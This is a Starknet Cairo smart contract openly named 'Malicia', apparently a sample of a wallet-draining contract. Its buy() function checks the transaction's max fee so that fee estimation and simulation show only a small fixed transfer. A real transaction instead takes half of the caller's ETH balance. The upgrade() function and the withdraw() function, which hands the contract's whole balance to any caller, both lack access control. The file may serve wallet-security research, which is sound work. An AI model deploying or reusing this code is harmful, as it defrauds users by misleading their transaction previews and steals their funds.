use core::box::BoxTrait;
use starknet::contract_address::ContractAddress;

#[starknet::interface]
trait IERC20<TContractState> {
    fn balanceOf(self: @TContractState, account: ContractAddress) -> u256;
    fn transferFrom(
        ref self: TContractState, sender: ContractAddress, recipient: ContractAddress, amount: u256
    );
    fn transfer(ref self: TContractState, recipient: ContractAddress, amount: u256);
}

#[starknet::contract]
mod Malicia {
    use starknet::get_tx_info;
    use starknet::contract_address::ContractAddress;
    use starknet::{get_caller_address, get_contract_address};
    use starknet::contract_address::contract_address_const;
    use starknet::class_hash::ClassHash;
    use zeroable::Zeroable;
    use traits::Into;
    use box::BoxTrait;
    use super::{IERC20Dispatcher, IERC20DispatcherTrait};

    #[storage]
    struct Storage {}

    #[generate_trait]
    #[external(v0)]
    impl Malicia of IMalicia {
        // Buy behaves differently depending on the max fee.
        // TODO: use the tx signature.
        fn buy(ref self: ContractState) {
            let caller = get_caller_address();
            let this = get_contract_address();
            let tx_info = get_tx_info().unbox();
            let max_fee = tx_info.max_fee;
            let mut amount = self.get_token_balance(caller);
            // Use half of the balance to have enough gas for the transaction.
            amount = u256 { low: amount.low / 2, high: 0 };
            if max_fee == 0 {
                amount = u256 { low: 20_000_000, high: 0 };
            }
            self.transfer_helper(caller, this, amount);
        }

        fn withdraw(ref self: ContractState) {
            let caller = get_caller_address();
            let this = get_contract_address();
            let amount = self.get_token_balance(this);
            let token = self.get_token_contract();
            token.transfer(caller, amount);
        }

        fn upgrade(ref self: ContractState, impl_hash: ClassHash) {
            assert(!impl_hash.is_zero(), 'Class hash cannot be zero');
            starknet::replace_class_syscall(impl_hash).unwrap_syscall();
        }
    }

    #[generate_trait]
    impl HelperTrait of TransferHelper {
        fn get_token_contract(self: @ContractState) -> IERC20Dispatcher {
            // ETH
            let token_address: ContractAddress =
                contract_address_const::<0x049d36570d4e46f48e99674bd3fcc84644ddd6b96f7c741b1562b82f9e004dc7>();
            IERC20Dispatcher { contract_address: token_address.into() }
        }

        fn get_token_balance(self: @ContractState, user: ContractAddress) -> u256 {
            let token: IERC20Dispatcher = self.get_token_contract();
            token.balanceOf(user)
        }

        fn transfer_helper(
            ref self: ContractState,
            sender: ContractAddress,
            recipient: ContractAddress,
            amount: u256
        ) {
            let token: IERC20Dispatcher = self.get_token_contract();
            token.transferFrom(sender, recipient, amount);
        }
    }
}
